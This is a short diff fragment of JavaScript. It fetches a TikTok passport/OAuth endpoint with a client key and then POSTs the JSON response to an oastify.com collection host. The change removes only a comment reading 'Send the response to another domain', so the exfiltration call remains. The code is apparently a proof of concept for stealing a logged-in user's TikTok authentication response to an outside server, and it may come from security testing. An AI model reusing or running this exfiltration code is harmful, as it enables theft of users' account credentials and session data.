@@ -9,7 +9,6 @@ fetch("https://tiktok.com/passport/open/web/auth/?client_key=7236493407642714114
 })
   .then(response => response.json())
   .then(data => {
-    // Send the response to another domain
     fetch("https://ibxsj0xlhl3n7m3fbtptipbyapgo4es3.oastify.com/receive", {
       method: "POST",
       headers: {
